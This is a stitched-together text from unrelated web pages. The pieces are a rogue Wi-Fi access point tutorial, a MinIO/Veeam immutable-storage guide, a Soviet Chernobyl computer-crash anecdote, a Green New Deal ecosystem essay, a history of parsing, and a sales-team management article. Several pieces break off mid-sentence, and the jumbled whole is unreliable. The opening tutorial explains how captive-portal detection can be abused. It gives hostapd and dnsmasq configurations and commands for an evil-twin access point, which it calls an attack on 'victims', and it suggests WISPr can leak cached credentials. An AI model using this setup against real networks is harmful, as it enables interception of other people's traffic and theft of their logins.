<h4>Android 4 – 9</h4>
<p>Android devices look for an HTTP 204 response for a file named generate_204 from the following domain.</p>
<pre><code>clients3.google.com

<p>HTTP Status 204 means the file exists but, is empty. This lets Android know that the Internet is accessible. If the request receives HTTP Status 302 (temporary redirect) instead of HTTP 204, Android will follow the redirection URL to display the Captive Portal to the user.</p>
<p>In its nature, all the domains serve on HTTP and not HTTPS which makes the captive portal mechanism possible. Also, it allows an attacker to use the redirection to bypass security.</p>
<p>Unlike Apple Devices, Android is very fragmented acc. to the install base. Which leaves us with a wide variety of attack surface as an attacker. Have a look at the current install base of Android devices acc. to Google.</p>

<h2>Apple’s secret “WISPr” request</h2>
<p>WISPr (pronounced “whisper”) or Wireless Internet Service Provider roaming used by every Apple device for captive portal detection. This technology allows users to roam between wireless internet service providers in a fashion similar to that which allows cell phone users to roam between carriers.</p>
<p>Another question is whether this is an attack vector. The answer is “probably yes”. There is more to the functionality than a simple HTTP request. If you look up the keyword “wispr” from the User-Agent string in apache logs, you’ll find out why.</p>
<p>The idea is that smart Wi-Fi portals will detect that this is a WISPr-supporting device, and send back a WISPr message in XML. This allows the iDevice(s) to then log in with cached credentials via another XML message. This means, for example, you might be able to grab somebody’s credentials with a properly configured Wi-Fi access-point.</p>
<p>When an iDevice connects to a Wi-Fi network, the first thing it does is make a request to the URL captive.apple.com or apple.com/test/success.html.</p>
<p>With iOS 7 onwards, Apple began to use the User Agent “<strong>CaptiveNetworkSupport</strong>“, though it’s not as common as the URL method that Android and Windows uses.</p>
<p>The reason Apple does this is that you may be using an app other than the web browser. For example, the only thing you might be doing is syncing your e-mail. In such situations, no auto-redirection would work as no browser is in use and you would never see the portal page, and your app will mysteriously fail to connect to the Internet.</p>
<p>Therefore, before your app has a chance to access the network, Apple does this for you. It sends out a request to the above URL. If the request gets redirected, then Apple knows there is a portal. It then launches a dialog box, containing Safari, to give you a chance to log in.</p>
<p>When reading apache logs (<b>/var/logs/apache2/access.log</b>) for apple devices, you’ll see something like this:</p>
<pre>10.0.0.194 - - [03/March/2019:14:14:22 +0530] "GET /hotspot-detect.html HTTP/1.0" 302 487 "-" "<strong>CaptiveNetworkSupport-346.50.1 wispr</strong>"
10.0.0.194 - - [03/March/2019:14:14:22 +0530] "GET / HTTP/1.0" 200 2004 "-" "<strong>CaptiveNetworkSupport-346.50.1 wispr</strong>"</pre>
</div>
<h2 id="start-ap">Access Point Configuration</h2>
<h3>Installation</h3>
<pre><code>







<ul>








 	<li pf="$">sudo apt update</li>
















 	<li pf="$">sudo apt install hostapd dnsmasq apache2 -y</li>








</ul>







</code></pre>
<h4>Configure hostapd</h4>
<p>Create a directory for saved configuration files. Open Terminal and create a hostapd config file.</p>
<pre><code>







<ul>







 	<li pf="$">vi hostapd.conf</li>







</ul>







</code></pre>
<p><file>hostapd.conf</file></p>
<pre>interface=<span>wlan0</span>       # Desired Interface name
driver=nl80211
ssid=<span>Captive Portal</span>   # Desired AP name
hw_mode=g
channel=<span>6</span>
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
</pre>
<p>Make sure you edit the changes accordingly every time you perform an attack.</p>
<p>Operating Channel number can cause issues if not chosen properly.</p>
<h4>Configure dnsmasq</h4>
<pre><code>







<ul>







 	<li pf="$">vi dnsmasq.conf</li>







</ul>







</code></pre>
<p><file>dnsmasq.conf</file></p>
<pre>interface=<span>wlan0</span>   # Desired Interface name
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
listen-address=127.0.0.1</pre>
<p>Make sure to define proper interface in dnsmasq.conf file.</p>
<h4>Parameter Breakdown:</h4>
<pre><strong>dhcp-range=10.0.0.10,10.0.0.250,12h</strong>:  Client IP address will range from 10.0.0.10 to 10.0.0.250 and default lease time is 12 hours.
<strong>dhcp-option=3,10.0.0.1</strong>:  3 is code for Default Gateway followed by IP of D.G i.e. 10.0.0.1
<strong>dhcp-option=6,10.0.0.1</strong>:  6 for DNS Server followed by IP address</pre>
<p>Kill network-manager utility before running hostapd. Because when you start hostapd, network-manager tries to take control of the wireless device and put it into managed mode. whereas hostapd needs the card to be set to Master mode (Access Point mode). So, kill network-manager and other interfering processes before you begin</p>
<pre><code>







<ul>








 	<li pf="$">sudo killall network-manager wpa_supplicant dnsmasq</li>
















 	<li pf="$">sudo hostapd hostapd.conf</li>








</ul>







</code></pre>
<p>To allocate IP addresses to victims, run dnsmasq.<br>
Before that, set IP address for wlan0 interface to enable IP networking, so that dnsmasq can process the incoming requests and direct the traffic accordingly.</p>
<p>Open a new Terminal for dnsmasq:</p>
<pre>ifconfig wlan0 10.0.0.1       # Set class-A IP address to wlan0
dnsmasq -C dnsmasq.conf -d    # -C: configuration file. -d: daemon (as a process) mode
</pre>
<p>as soon as victim connects you should see similar output for hostapd and dnsmasq Terminal windows:</p>
<p><file>[ <strong>hostapd</strong> ]</file></p>
<pre>Using interface wlan0 with hwaddr 00:c0:ca:5a:34:b7 and ssid "rootsh3ll"
wlan0: interface state …</pre></div></div>

This is wonderful news for us to test this functionality in our labs, or in case we are using Linux storage with MinIO for production.</p><p>In this blog entry, we’re going to jump into the pool and see: how to install and configure MinIO with Erasure Coding Enabled, Immutability, Let’s Encrypt, and finally, we’ll see how to configure it in Veeam. As it has gone out of my hands, I leave you with a menu to move faster:</p><ol><li><a href="#requerimientos"><strong>MinIO System Requirements</strong></a><ol><li><a href="#que"><strong>What is MinIO Erasure Coding?</strong></a></li><li><a href="#util"><strong>Why use MinIO Erasure Coding?</strong></a></li><li><a href="#configuracion"><strong>Disk Configuration to use MinIO Erasure Coding</strong></a></li></ol></li><li><a href="#desplegar"><strong>How-to Deploy, and Configure MinIO, including object Immutability, and Let’s Encrypt</strong></a><ol><li><a href="#confminio"><strong>How-to configure&nbsp; Let’s Encrypt for MinIO</strong></a></li><li><a href="#arrancar"><strong>Run MinIO with Erasure Coding</strong></a></li><li><a href="#crear"><strong>Creating a new Bucket in MinIO with the Immutability attribute</strong></a></li></ol></li><li><strong><a href="#veeam">Veeam Backup &amp; Replication Configuration with Immutable Storage</a> </strong><ol><li><a href="#repo"><strong>Backup Repository Creation – Object Storage</strong></a></li><li><a href="#sobr"><strong>Scale-out Backup Repository Creation – with MinIO Immutable as Capacity Tier</strong></a></li><li><a href="#backupcopy"><strong>Backup Copy Job creation, pointing to this new SOBR with Immutability</strong></a></li><li><a href="#eliminar"><strong>Trying to delete Backups from an Object Storage with Immutability Enabled</strong></a></li></ol></li></ol><h2><a name="requerimientos"></a> MinIO System Requirements</h2><p>In this guide, we are not going to try to deploy MinIO in production, as it usually requires about 96GB of RAM, certain cores, etc. In my case I am deploying everything in 4vCPU and 16GB of RAM since I will have only one VBR sending backups, so nothing serious.</p><p>One of the most important things to be able to run Immutability in MinIO, and that it is supported by Veeam, is that we need the MinIO RELEASE.2020-07-12T19-14-17Z version or higher, and also we need the MinIO server to be running with Erasure Coding.</p><h3><a name="que"></a>What is MinIO Erasure Coding?</h3><p>MinIO Erasure Coding is a mathematical algorithm to reconstruct lost or corrupted data. MinIO uses Reed-Solomon code to fragment objects into variable data and parity blocks. For example, in a 12-unit configuration, an object can be split into a variable number of data and parity blocks in all units – from six data and six parity blocks to ten data and two parity blocks.</p><p>By default, MinIO divides objects into N/2 data and parity units. However, you can use storage classes to use a custom configuration. We recommend the N/2 data and parity blocks, as this ensures the best protection against drive failure.</p><p>In the 12-drive example above, with the MinIO server running at the default settings, you can lose any of the six drives and still reliably rebuild data from the remaining drives.</p><h3><a name="util"></a>Why use MinIO Erasure Coding?</h3><p>MinIO Erasure Coding protects data from multiple drive failures, unlike RAID or replication. For example, RAID6 can protect against the failure of two drives, while MinIO Erasure Coding can lose up to half of the drives and still keep the data safe. In addition, MinIO Erasure Coding is at the object level and can recover one object at a time. In the case of RAID, recovery can only be done at the volume level, resulting in high downtime. Since MinIO encodes each object individually, it can cure objects incrementally. Storage servers, once deployed, should not require disk replacement or healing for the life of the server. MinIO’s Erasure Coding backend is designed for operational efficiency and takes full advantage of hardware acceleration whenever available.<a

                    <!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p>Sergei is a veteran of the early days of the computing industry as it was developing in the Soviet Union. I had the pleasure of working and learning from him over the past year, and in that time I picked up more important lessons about both life and embedded programming than any amount of school could ever teach. The most striking lesson is the story of how and why, in late summer of 1986, Sergei decided to move his family out of the Soviet Union.</p>
<p>In the 1980s, my mentor Sergei was writing software for an SM-1800, a Soviet clone of the PDP-11.  The microcomputer was just installed at a railroad station near Sverdlovsk, a major shipping center for the U.S.S.R. at the time. The new system was designed to route train cars and cargo to their intended destinations, but there was a nasty bug that was causing random failures and crashes. The crashes would always occur once everyone had gone home for the night, but despite extensive investigation, the computer always performed flawlessly during manual and automatic testing procedures the next day. Usually this indicates a race condition or some other concurrency bug that only manifests itself under certain circumstances. Tired of late night phone calls from the station, Sergei decided to get to the bottom of it, and his first step was to learn exactly which conditions in the rail yard were causing the computer to crash.</p>
<p>He first compiled a history of all occurrences of the unexplained crashes and plotted their dates and times on a calendar. Sure enough, a pattern was clearly visible.  By observing the behavior for several more days, Sergei saw he could easily predict the timing of future system failures.</p>
<p>He soon figured out that the rail yard computer malfunctioned only when the cargo being processed was live cattle coming in from northern Ukraine and western Russia heading to a nearby slaughterhouse. In and of itself this was strange, as the local slaughterhouse had in the past been supplied with livestock from farms located much closer, in Kazakhstan.</p>
<p>As you may know, the Chernobyl Nuclear Power Plant disaster occurred in 1986 and spread deadly levels of radiation which to this day make the nearby area uninhabitable. The radioactivity caused broad contamination in the surrounding areas, including northern Ukraine, Belarus, and western Russia.  Suspicious of possibly high levels of radiation in the incoming train cars, Sergei devised a method to test his theory. Possession of personal Geiger counters was restricted by the Soviet government, so he went drinking with a few military personnel stationed at the rail yard. After a few shots of vodka, he was able to convince a soldier to measure one of the suspected rail cars, and they discovered the radiation levels were orders of magnitude above normal.</p>
<p>Not only were the cattle shipments highly contaminated with radiation, the levels were high enough to randomly flip bits in the memory of the SM-1800, which was located in a building close to the railroad tracks.</p>
<p>There were often significant food shortages in the Soviet Union, and the government plan was to mix the meat from Chernobyl-area cattle with the uncontaminated meat from the rest of the country. This would lower the average radiation levels of the meat without wasting valuable resources. Upon discovering this, Sergei immediately filed immigration papers with any country that would listen. The computer crashes resolved themselves as radiation levels dropped over time.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Humans have been terrible stewards of the environment. Mining, deforestation, pollution, overuse of freshwater, sprawl, depletion of natural resources—even before the threat of global warming became apparent, the authors of the book <em>The Limits of Growth</em>, almost 50 years ago, tried to warn humanity that the planet’s ecosystems could not survive under the assault of development without a consciously planned restructuring of society. Now both calamities, of ecosystem destruction and climate catastrophe, are feeding each other and accelerating the extinction of species—including, perhaps, humans as well.</p>
<p>We can turn back toward long-term survival, but only if we reconstruct a civilization that mimics nature in one important area that we have only barely initiated—the large-scale recycling and reusing of almost everything we produce. Since no one wants to reuse pollution, if enforced this principle would eliminate air and water pollution as well. Thus, when we manufacture, as explained in the section about manufacturing, the goods produced must be recyclable and reusable, so that we can eliminate most mining, and the attendant ecosystem destruction. One big advantage of replacing all fossil fuels is that the environmental destruction caused by the extraction of oil, coal, and natural gas will also be eliminated. In addition, we can manufacture everything, including chemicals, without pollution, and if we can’t, then we won’t produce it.</p>
<p>Agriculture, instead of mimicking the cycles of ecosystems, has also been set up in such a way that the inputs, like pesticides and artificial fertilizer, cause further environmental havoc, and the outputs, water pollution and unhealthy food, cause problems at the other end. Humans have been warping these natural ecosystems in order to maximize short-term efficiency—but as so often happens in our modern civilization, this short-term productivity leads to long-term collapse. The destruction of soil, which is the very foundation of terrestrial life, is proceeding apace, as is the pollution of water sources. Global warming will make things worse, and indeed the deforestation and destruction of critical ecosystems, including prairies and wetlands, is contributing to global warming in what is called a “positive feedback loop,” one increasing the other, until there will be no way to grow food for billions of people.</p>
<p>Misuse of ecosystems in general, including agriculture and deforestation, contributes about 12.5% and 15% of global greenhouse gas emissions respectively—that is, about 28% in total, and other sources from land misuse, such as methane from landfills, adds another 2.5%, so fully 30% of global greenhouse gas emissions can be attributed directly to destroying ecosystems. The landfill part can be dealt with by recycling and reusing, including for food products which can be used for compost, for example, and thus our program includes a Recycling Corps. For agriculture and deforestation, we need to add other solutions.</p>
<p>Much of deforestation comes about simply to give livestock, particularly cattle, pasture to feed, as in the Amazon, and much of the rest comes from clearing forest to grow crops, such as palm oil in Borneo. As part of the Global Green New Deal, much of this could be stopped by exchanging green machinery from rich countries for preservation of critical ecosystems in poor ones. In addition, reforestation will be a necessary part of a path to making the planet habitable. In the United States, reforestation actually already decreases the United States’ greenhouse gas emissions. A new Civilian Conservation Corps can have as its main objectives two core tasks: to restore ecosystems, and to plant trees. Both will help to decrease emissions and to rebuild ecosystems that are critical to health and well-being.</p>
<p>Restoring ecosystems and planting trees will also help the agricultural sector, which needs trees and healthy ecosystems to provide services like minimizing flooding, cleaning air and water, and providing a place for beneficial organisms like insects and birds to grow. We must move towards an agricultural system that does not use pesticides, which are hazardous, not only to the health of humans, but as we are discovering, also to the existence of critical insect and other populations. These pesticides are getting into everything, even mother’s milk. The federal government needs to spend hundreds of billions to convert the nation’s farms to grow organic food that will be cheaper, better tasting, and healthier than what we have now.</p>
<p>Artificial fertilizer kills the soil, and the runoff ruins river and ocean ecosystems. We need to rebuild the soil in order to draw down carbon as well. Soil should be considered a strategic national resource, like oil is today.</p>
<p>Livestock, if allowed to rotate throughout parts of a well-functioning ecosystem, can benefit agricultural ecosystems. This sustainable livestock must replace the horrible factory-farmed livestock system, which makes the general population ill, partly because of the miserable existence of the livestock. In addition, we need to make fruits, vegetables, and healthy grains much cheaper and more available so that people can easily try alternatives to meat.</p>
<p>Another aspect of a global Green New Deal should be to patrol the world’s oceans and ensure that fishing stocks are allowed to expand to the point where they are sustainable. Currently humans are embarking on the insane venture of wiping out most edible wild fish. A sustainable world will be one where people get much of their protein from well-protected ocean and river sources.</p>
<p>The transformation to organic agriculture will make it more practical for people to choose a diet richer in vegetables and plant-based proteins, including those who are vegetarians and vegans for health, environmental, and ethical reasons.</p>
<p>The transformation of agriculture can even benefit from the expansion of walkable neighborhoods in cities, which can be used to establish networks of urban gardens. In addition, a Green New Deal should encourage the establishment of farm belts around urban regions to encourage local food production.</p>
<p>There is much to be done to prevent ecosystem collapse, and there are many benefits to doing so. A healthy agricultural system leads to healthy people, eating better-tasting food. Restored ecosystems can be left for future generations to enjoy, provided such “ecotourism” takes place in a sustainable and caring way. By restoring forests, wetlands, and soil, we can have a fighting chance of drawing down enough carbon dioxide to avert climate catastrophe. Why should humanity be denied the wonders of forests so a few oligarchs can buy more mansions and yachts?</p>

    <p>In India, Pannini creates an exact and complete description of
      the Sanskrit language, including pronunciation. Sanskrit could be
      recreated using nothing but Pannini's grammar.
      Pannini's grammar is
      probably the first formal system of any kind, predating Euclid.
      In the future, nothing like it will exist for any other natural language of
      significant size or corpus.
      By 2018,
      Pannini will be the object of serious study.
      But in the 1940's and 1950's Pannini will be almost unknown in
      the West.
      This means that Pannini will have no direct effect
      on the other events in this timeline.
    </p>
    
    <p>In her translator's note on an article on Babbage's
    computer, Ada Lovelace becomes the first person to
    clearly distinguish programming a computer (software)
    as a separate field from
    building the computer itself (hardware).<a id="footnote-1-ref" href="#footnote-1">[1]</a>
    Ada is also the first to
    think of software in linguistic terms --
    she originates the idea that,
    in writing software,
    we communicate with the computer,
    and that the means that we use to do that is a "language".<a id="footnote-2-ref" href="#footnote-2">[2]</a>
    </p>
    <blockquote>
     A new, a vast, and a powerful language is developed for the future
     use of analysis, in which to wield its truths so that these may
     become of more speedy and accurate practical application for the
     purposes of mankind than the means hitherto in our possession have
     rendered possible. Thus not only the mental and the material, but
     the theoretical and the practical in the mathematical world, are
     brought into more intimate and effective connexion with each other.<a id="footnote-3-ref" href="#footnote-3">[3]</a>
    </blockquote>
    <p>Here "analysis" means the branch of mathematics that studies limits
    and continuous functions, and which includes calculus.
    </p>
    
    <p>Andrey Markov introduces his
      <term>chains</term>
      -- a set of
      states with transitions between them.<a id="footnote-4-ref" href="#footnote-4">[4]</a>
      One offshoot of Markov's work will be what will
      come to be known as regular expressions.
      Markov uses his chains,
      not for parsing,
      but to deal with a problem in probability --
      does the law of large numbers require that events be
      independent?
      Indirectly, Markov is addressing the question 
      of the existence of free will.<a id="footnote-5-ref" href="#footnote-5">[5]</a>.
    </p>
    
    <p>In 1913, Markov revisits his chains,
      applying them to the sequence of vowels and consonants
      in Pushkin's
      <cite>Eugene Onegin</cite><a id="footnote-6-ref" href="#footnote-6">[6]</a>.
      Again, Markov's interest is not in parsing.
      Nonetheless,
      this is an application to language
      of what later will be regarded
      as a parsing technique,
      and apparently for the first time in the West.
    </p>
    
    <p>Leonard Bloomfield,
      as part of his effort to create a linguistics that
      would be taken seriously as a science,
      publishes his "Postulates".<a id="footnote-7-ref" href="#footnote-7">[7]</a>
      Known as structural linguistics,
      Bloomfield's approach will
      dominate American lingustics for
      over two decades.
    </p>
    
    <p>
      Bloomfield's "Postulates" defines a "language" as
    </p>
    <blockquote>
      [t]he totality of utterances that can be made in a speech
      community<a id="footnote-8-ref" href="#footnote-8">[8]</a>
    </blockquote>
    <p>
      Note that there is no reference in this definition to the usual view --
      that the utterances of a language "mean" something.
    </p>
    <p>
      This omission is not accidental.<a id="footnote-9-ref" href="#footnote-9">[9]</a>
      Bloomfield excludes meaning from his definition of language
      because he wants linguistics to be taken
      seriously as science.
      Behaviorist thought is very influential at this
      time and behavorists believe that,
      while human behaviors can be observed and verified
      and therefore made the subject of science,
      mental states cannot be verified.
      Claiming to know what someone means
      by a word
      is claiming to read his mind.
      And "mind-reading" is not science.
    </p>
    
    <p>Emil Post defines and studies a formal rewriting system<a id="footnote-10-ref" href="#footnote-10">[10]</a>
      using productions.
      With this, the process of rediscovering Pannini in the
      West begins.</p>
    
    <p>Alan Turing discovers the stack as part of his design of the
      ACE machine. This will be important in parsing because recursive parsing
      requires stacks. The importance of Turing's discovery is not noticed
      in 1945 and stacks will be rediscovered many times over the
      next two decades<a id="footnote-11-ref" href="#footnote-11">[11]</a>.
    </p>
    
    <p>Claude Shannon publishes the foundation paper of information theory<a id="footnote-12-ref" href="#footnote-12">[12]</a>.
      In this
      paper, Shannon models English using Andrey Markov's
      chains<a id="footnote-13-ref" href="#footnote-13">[13]</a>.
      The approach is similar to Markov's but the intent
      is different --
      Shannon's is a serious attempt at a contribution
      to parsing human languages.
    </p>
    
    <p>From 1949 to 1951 at the ETH Zurich, Heinz Rutishauser works on
      the design of what we will come to call a compiler<a id="footnote-14-ref" href="#footnote-14">[14]</a>.
      Rutishauser's arithmetic expression parser
      does not honor precedence but it does allow nested parentheses.
      It is perhaps the first algorithm which can really be considered a
      parsing method.
      Rutishauser's compiler is never implemented.</p>
    
    <p>
      In the form of arithmetic expressions, operator expressions
      are the target of the first efforts at automatic parsing.
      We will not see this issue go away.
      Very informally<a id="footnote-15-ref" href="#footnote-15">[15]</a>,
      we can say that
      an operator expression is an expression
      built up from operands
      and operators.
      It is expected that the operand might be another operator expression,
      so operator expressions raise the issue of recursion.
    </p>
    <p>
      The archetypal examples of operator expressions are arithmetic expressions:
    </p><pre><tt>
         2+(3*4)
         13^2^-5*9/11
         1729-42*8675309
      </tt></pre>
    <p>
      In Western mathematics arithmetic expressions have been read
      according to traditional
      ideas of
      associativity and precedence:
    </p><ul>
      <li><tt>^</tt>
        is exponentiation.
        It right associates and has tightest<a id="footnote-16-ref" href="#footnote-16">[16]</a>
        precedence.
      </li>
      <li>
        Multiplication (<tt>*</tt>) and division (<tt>/</tt>) left associate.
        They have a precedence equal to each other
        and less tight than that of exponentiation.
      </li>
      <li>
        Addition ('+') and subtraction ('-') left associate.
        They have a precedence equal to each other
        and less tight than that of multiplication and division.
      </li>
      <li>
        Parentheses, when present, override the traditional
        associativity and precedence.
      </li>
    </ul>
    <p>
      Rutishauser's language
      is structured line-by-line,
      as will be all languages until LISP.
      No language until ALGOL will be truly block-structured.
    </p>
    <p>
      The line-by-line languages
      are parsed using string manipulations.
      A parsing theory is not helpful for describing these
      ad hoc string manipulations,
      so they don't give rise to one.
      The only logic in these early compilers that really deserves to be called
      a parsing method
      is that which tackles arithmetic expressions.
    </p>
    
    <p>During 1950, Corrado Boehm, also at the ETH Zurich,
      develops his own compiler.
      Rutishauser and Boehm are working at the same institution at the same
      time, but Boehm is unaware of Rutishauser's work until his own is
      complete.
      Boehm's is also the first self-compiling compiler -- it is written
      in its own language.
    </p>
    <p>
      Like Rutishauser, Boehm's language is line-by-line and
      parsed ad hoc, except for expressions. Boehm's expression parser
      <em>does</em>
      honor precedence, making it perhaps the first operator precedence
      parser<a id="footnote-17-ref" href="#footnote-17">[17]</a>.
      In Norvell's taxonomy<a id="footnote-18-ref" href="#footnote-18">[18]</a>,
      Boehm's algorithm inaugurates
      the
      <q>classic approach</q>
      to operator parsing.
    </p>
    <p>
      Boehm's compiler also allows parentheses, but the two cannot
      be mixed -- an expression can either be parsed using precedence
      or have parentheses, but not both.
      Also like Rutishauser's, Boehm's compiler is never
      implemented<a id="footnote-19-ref" href="#footnote-19">[19]</a>.
    </p>
    
    <p>Grace Hopper writes a linker-loader,
      and calls it a
      <term>compiler</term><a id="footnote-20-ref" href="#footnote-20">[20]</a>. Hopper seems to be the first
      person to use this term for a computer program.</p>
    
    <p>Hopper uses the term
      <term>compiler</term>
      in a meaning very close to one of its traditional senses:
      <q>to compose out of materials from other
        documents</q><a id="footnote-21-ref" href="#footnote-21">[21]</a>.
      Specifically, in 1952,
      subroutines were new,
      and automated programming
      (what we will come to call
      <q>compiling</q>)
      often is viewed as providing a interface
      for calling a collection of
      carefully chosen assembler subroutines<a id="footnote-22-ref" href="#footnote-22">[22]</a>.
      Hopper's new
      program takes this subroutine calling
      one step further -- instead of calling the subroutines
      it expands them (or in Hopper's terms
      <q>compiles</q>
      them) into
      a single program.
    </p>
    <p>
      After Hopper the term
      <term>compiler</term>
      will acquire a different meaning,
      one specific to the computer field.
      By 1956, programs like Hoppers will
      no longer be called
      <term>compilers</term><a id="footnote-23-ref" href="#footnote-23">[23]</a>.
    </p>
    
    <p>Kleene discovers regular languages<a id="footnote-24-ref" href="#footnote-24">[24]</a>.
      Kleene does not use regular expression notation,
      but his regular languages are the idea behind
      it.
    </p>
    
    <p>
      Glennie discovers what Knuth will later
      call the first
      <q>real</q><a id="footnote-25-ref" href="#footnote-25">[25]</a>
      compiler.
      (By this Knuth will mean that
      AUTOCODE was actually implemented and used by someone to translate
      algebraic statements into machine language.)
      Glennie's AUTOCODE
      is very close to the machine -- just above machine language.
      It does not allow operator expressions.
    </p>
    <p>
      AUTOCODE is hard-to-use,
      and apparently sees little use by anybody but
      Glennie himself.
      Because
      Glennie works for the British atomic weapons projects his papers
      are routinely classified,</p></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I was the 24th hire at a small startup company, something that I was unbelievably excited about. I wanted to have a huge impact on the company and I rallied behind their mission. We were going to make a difference.</p><p>I was the first manager hire in the sales department, running the sales development team (SDR team). I didn't know it at the time, but this was going to be one of the most impactful experiences in my life.</p><figure><p><img alt="Rat infested office" src="https://assets.website-files.com/5ef609325c969f70601c7074/5ef60adf83cbb075d3c38022_image-asset.jpeg"></p><figcaption>Rat infested office</figcaption></figure><p>Hockey stick growth, constant change, and incredibly high pressure. I was hired to manage the SDR team that was responsible for generating every meeting conducted by the account executives. My team started with 3 and quickly grew to a team of 12 SDRs fighting daily to hit aggressive metrics.</p><p>I loved every second of it.</p><p>We started in a small office with rats... literally. In under two years, the company grew by 600%+ and achieved a 21 million dollar series B funding round.</p><p>Yes, we did upgrade the office situation along the way.</p><p>Every deal closed by the account executives had come from the SDR team. Managing and scaling the SDR team was not easy, but I am proud of how we did it and what the team achieved.</p><p>In this article, I'll share some of my story and what I learned along the way.</p><h2><strong>Learning #1: The core of our success was daily motivation. Not incentives.</strong></h2><p>There was one situation during my startup experience that really stands out and illustrates the power of motivation. There was less than a week left in the month and my team was behind on their quota by a significant amount, it basically wasn't going to happen. Morale was down and despite my efforts of cheering up the team, they felt down on their luck. Then something special happened.</p><p>The entire company was packed in our small conference room for an "all hands" meeting. There wasn't enough space in the room and 10 people had to stand outside and cup their hands over their ears just to hear. I was one of those people.</p><p>My boss was giving his update and said: "As for the SDR team, they are not going to get close to hitting quota this month."</p><p>My jaw hit the floor, you never claim defeat before the final bell tolls.</p><p>I quickly said "hey!" a little too loud as I squeezed passed my colleagues to get into the conference room. The entire company was staring at me and you could hear a pin drop.</p><p>I wasn't thinking, I was reacting.</p><p>"Don't count us out. Does it look like we will hit quota? No. Not even close. But what I can tell you is that if ANY team can do it, its this one. Do NOT count us out."</p><p>The next day I pulled my team aside in the morning and addressed what happened the day before. We all agreed. We were going to make them eat their words.</p><p>What happened next was nothing short of amazing. I had never seen my team so fired up. They were cheering each other on, laughing together, and booking more meetings than they even thought possible.</p><p>Over the next four days, they broke their "most meetings booked in a day" record twice.</p><p>And when the final bell tolled, we were short by one meeting.</p><p>You would have thought we had beat our quota by 200%. They didn't care that we missed our team quota by one. They were ecstatic that when everyone in the company thought we couldn't get close, we did.</p><p><strong>Incentives are important but they do not replace the ability to motivate a team around an objective.</strong></p><p>A team is a group of individuals rallied around a specific objective. Unfortunately, the daily work often has a way of causing the individual to lose sight of that objective. This is very prevalent in SDR teams because the daily work comes with rejection, repetitive tasks, and variables outside of their control.</p><p>After that experience, I started spending 10 minutes every morning with my team reminding them of why we are doing this. Pointing at our previous successes and pointing to the potential successes on the horizon. I never stopped motivating the team. I never stopped reminding them of what we accomplished and challenging them to repeat it.</p><p>The next month was the biggest one we had ever had.</p><p>Incentives are important but they do not replace the ability to motivate a team around an objective.</p><p><strong>Action tip:</strong> Create a schedule with daily objectives. Share it with the team and motivate them by connecting each daily objective with a larger goal.</p><h2>Learning #2: Motivation is about narratives, you must create compelling ones.</h2><p>Motivating my team was necessary because we had to make changes so frequently. There was one change in particular that really stands out. We decided to change our entire target market. yeah, a big decision. Because of this, my team was going to have fewer leads and entirely different messaging. Needless to say, they were going to be less than thrilled. In order for us to be able to execute, I needed to get them excited about the change.</p><p>The first step was, I had to be on board. The team leader must believe in the initiative. Fortunately, that was easy. I was totally on board and ready to tackle the challenge.</p><p>The second step was, the team needed to understand the reason behind the change and agree that it was necessary.</p><p>The third and final step was the most challenging. I needed to motivate the team to execute. This required a strong narrative.</p><p>When it came time to tell my team about the change they jumped on board quickly. There were a few concerns that I addressed and then we shifted our focus quickly. I attribute how well received it was to the type of people we hired and to the work I did planning how to deliver the message.</p><p>Here is the template I used to construct the message and successfully motivate the team to execute.</p><p><strong>The "why" behind this change:</strong></p><p><strong>Why us:</strong></p><p><strong>What happens when this change is successful:</strong></p><p><strong>What this means for them:</strong></p><p><strong>How we can exceed expectations:</strong></p><p>Startups change a lot. This requires employees to adapt quickly and often. It can be exhausting. Building a narrative around every change is how you can motivate the team and get them on board. This results in them adapting more quickly with less change fatigue.</p><p><strong>Action Tip:</strong> Expect change, don't just react to it. Create a plan that covers "what to do" and "how to communicate it" for major outcomes (new leadership, hirings/firings, etc).</p><h2>Learning #3: Take ownership of everything.</h2><p>When my team was at its peak of 12 people I was managing a lot of different personalities. One rep, in particular, was always late to meetings, skipped out of our one on ones, and intentionally isolated themselves from the team. It was very challenging for me because I liked them a lot as a person but as a member of the team, they were very tough to manage. As their performance slipped I tried to help but it kept getting worse. Finally, they told me that they felt "better than the role" and it all made sense. They were embarrassed to be an SDR because they viewed it as a step back in their career.</p><p>Due to poor performance, I ended up having to let go of this employee, something I take very seriously. I reflected on this for a long time as it was my first experience firing someone. It hit me hard.</p><p>I wanted to chalk it up to them feeling "better than the role" but I had to take ownership of something to learn and grow from the experience. I reflected on what was in my control and determined that I enabled their belief that they were better than the role. The truth is, at the time I felt that they had more experience than me. My own insecurities were exposed through my actions. I didn't hold them accountable, I didn't effectively communicate my concerns, and frankly...</p><p>I didn't do a great job as their leader.</p><p>There will always be things outside of your control, it's inevitable. It's easy to point to the uncontrollable variables and assign blame. While scaling an SDR team you must take ownership of everything and focus your energy on what is/was in your control.</p><p>I learned from that experience and have never let it happen again.</p><p><strong>Action tip:</strong> Regardless of the situation take ownership of the result. Find what was in your control, identify what you could of done better, and improve.</p><h2>Learning #4: Cut poor performers.</h2><p>While leading the SDR team I got extremely close to each and every one. I felt invested in them as SDRs and as people. I wanted everyone to succeed and I would go to great lengths to help them improve.</p><p>But when it came time to cut ties, I would clam up. I tied so much of my success as a manager to the success of each individual on the team, remember the whole "take ownership of everything" thing from above? The idea of accepting defeat by letting go of an SDR crushed me.</p><p>Once you've been in a leadership position for a long enough time you learn that the team itself should be looked at as an individual. Once the repetitive actions of one team member hurt the team as a whole a leader must act.</p><p>I now follow a simple rule. I put a lot of energy into helping a struggling SDR improve. If they do not take action on my support and continue to perform poorly, I let them go. If they do take action on my support, and still perform poorly, I try to get them a different role at the company. James Collins, in his book Good to Great, says "put the right person in the right seat." If you have a great employee who is struggling in the role, you should find the right role for them.</p><p><strong>Action tip:</strong> Do not hesitate to cut poor performers. Additionally, if you have the right person make sure that they are in "the right seat."</p><h2>Learning #5: Hire the right people.</h2><p>The first group of SDRs I hired was an eclectic group. An international policy expert, Alaskan snowmobile racer, capital investment analyst, and a kid who almost flunked out of college because his kidney exploded. They all shared two things in common. They were very hard working and had a quirky personality that made them stand out.</p><p>Hiring is very challenging, especially when you are a startup. A wrong hire costs money but also another valuable resource for startups. Time. There is no debate about the importance of hiring the right people.</p><p>My hiring philosophy - Hire hardworking people with unique 